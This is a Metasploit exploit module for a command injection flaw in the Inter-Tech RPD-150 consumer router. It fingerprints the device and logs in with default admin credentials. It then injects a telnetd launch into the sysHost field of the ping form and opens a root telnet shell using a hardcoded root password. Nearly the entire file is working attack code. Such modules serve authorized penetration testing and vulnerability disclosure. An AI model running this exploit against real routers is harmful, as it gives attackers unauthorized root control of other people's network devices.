##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStagerEcho

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Inter-Tech Devices Remote Command Injection',
      'Description' => %q{
        The Inter-Tech RPD-150 consumer routers are vulnerable to a command
        injection exploit in the sysHost parameter of the web interface.
        The operating system from the target device is very much stripped. There
        is no wget, no chmod and no working echo for our typical tasks. In this
        case we start a telnetd and use it as a bind shell.
      },
      'Author'      =>
        [
          'Falk Husemann', # Vulnerability discovery
          'Michael Messner <devnull[at]s3cur1ty.de>', #Metasploit module
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          ['URL', 'http://falkhusemann.de/blog/2014/04/os-command-injection-am-beispiel-inter-tech-rpd-150/']
        ],
      'DisclosureDate' => 'Apr 22 2014',
      'Privileged'     => true,
      'Platform'       => ['unix'],
      'Arch'           => ARCH_CMD,
      'Payload'     =>
        {
          'Compat'  => {
            'PayloadType'    => 'cmd_interact',
            'ConnectionType' => 'find',
          },
        },
      'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/interact' },
      'Targets'        =>
        [
          [ 'Automatic', { } ],
        ],
      'DefaultTarget'  => 0
      ))

    register_options([
      OptString.new('USERNAME', [ true, 'Valid router administrator username', 'admin']),
      OptString.new('PASSWORD', [ false, 'Password to login with', 'admin']),
      OptAddress.new('RHOST', [true, 'The address of the router', '192.168.1.1']),
      OptPort.new('LPORT', [true, 'The port of the telnetd listener', '4444']),
      OptInt.new('TIMEOUT', [false, 'The timeout to use in every request', 20])
    ], self.class)

    register_advanced_options(
      [
        OptInt.new('TelnetTimeout', [ true, 'The number of seconds to wait for a reply from a Telnet command', 10]),
        OptInt.new('TelnetBannerTimeout', [ true, 'The number of seconds to wait for the initial banner', 25])
      ], self.class)
  end

  def tel_timeout
    (datastore['TelnetTimeout'] || 10).to_i
  end

  def banner_timeout
    (datastore['TelnetBannerTimeout'] || 25).to_i
  end

  def check
    begin
      res = send_request_cgi({
        'uri'     => '/home.htm',
        'method'  => 'GET'
      })

      if res && [200, 301, 302].include?(res.code) && res.headers['Server'] =~ /Boa\/0.94.14rc21/
        return Exploit::CheckCode::Detected
      end
    rescue ::Rex::ConnectionError
      return Exploit::CheckCode::Unknown
    end

    Exploit::CheckCode::Unknown
  end

  def exploit
    lport = datastore['LPORT']
    cmd = "telnetd -p #{lport}"

    print_status("#{peer} - Trying to access the vulnerable URL...")

    unless check == Exploit::CheckCode::Detected
      fail_with(Failure::Unknown, "#{peer} - Failed to access the vulnerable URL")
    end

    test_login

    print_status("#{peer} - Exploiting...")
    execute_command(cmd)

    print_status("#{rhost}:#{rport} - Trying to establish a telnet connection...")
    ctx = { 'Msf' => framework, 'MsfExploit' => self }
    sock = Rex::Socket.create_tcp({ 'PeerHost' => rhost, 'PeerPort' => lport.to_i, 'Context' => ctx })

    if sock.nil?
      fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Backdoor service has not been spawned!!!")
    end

    add_socket(sock)

    print_status("#{rhost}:#{rport} - Trying to establish a telnet session...")
    prompt = negotiate_telnet(sock)
    if prompt.nil?
      sock.close
      fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Unable to establish a telnet session")
    else
      print_good("#{rhost}:#{rport} - Telnet session successfully established...")
    end

    handler(sock)
  end

  # Sends an HTTP request with authorization header to the router
  # Raises an exception unless the login is successful
  def test_login
    print_status("#{peer} - Trying to login with #{user}:#{pass}")

    res = send_auth_request_cgi({
      'uri' => '/',
      'method' => 'GET'
    })

    if not res or res.code == 401 or res.code == 404
      fail_with(Failure::NoAccess, "#{peer} - Could not login with #{user}:#{pass}")
    else
      print_good("#{peer} - Successful login #{user}:#{pass}")
    end
  end

  # Run the command on the router
  def execute_command(cmd)
    res_req = send_auth_request_cgi({
      'uri' => '/syscmd.htm',
      'method' => 'GET'
    })
    if not res_req or res_req.code != 200
      fail_with(Failure::NoAccess, "#{peer} - some error happened")
    end

    # command injection
    res_cmd = send_auth_request_cgi({
      'uri' => '/boafrm/formSysCmd',
      'method' => 'POST',
      'encode_params' => false,
      'vars_post' => {
         "submit-url" => "%2Fsyscmd.htm",
         "sysCmd" => "ping",
         "sysMagic" => "",
         "sysCmdType" => "ping",
         "sysHost" => ";#{cmd}",
         "apply" => "Save%2FApply",
         "msg" => "xyz"
      }
    })
    if not res_cmd or res_cmd.code != 302
      fail_with(Failure::NoAccess, "#{peer} - some error during injection happened")
    end

    res_req = send_auth_request_cgi({
      'uri' => '/syscmd.htm',
      'method' => 'GET'
    })
    if not res_req or res_req.code != 200
      fail_with(Failure::NoAccess, "#{peer} - some error happened")
    end
  end

  # Helper methods
  def user; datastore['USERNAME']; end
  def pass; datastore['PASSWORD'] || ''; end

  def send_auth_request_cgi(opts={}, timeout=nil)
    timeout ||= datastore['TIMEOUT']
    opts.merge!('authorization' => basic_auth(user, pass))
    begin
      send_request_cgi(opts, timeout)
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unknown, "#{peer} - Could not connect to the webservice")
    end
  end

  def negotiate_telnet(sock)
    login = read_telnet(sock, "login: $")
    if login
      sock.put("root\r\n")
    end
    pass = read_telnet(sock, "Password: $")
    if pass
      sock.put("admin\r\n")
    end
    return read_telnet(sock, "# $")
  end

  def read_telnet(sock, pattern)
    begin
      Timeout.timeout(banner_timeout) do
        while(true)
          data = sock.get_once(-1, tel_timeout)
          return nil if not data or data.length == 0
          if data =~ /#{pattern}/
            return true
          end
        end
      end
    rescue ::Timeout::Error
      return nil
    end
  end

end
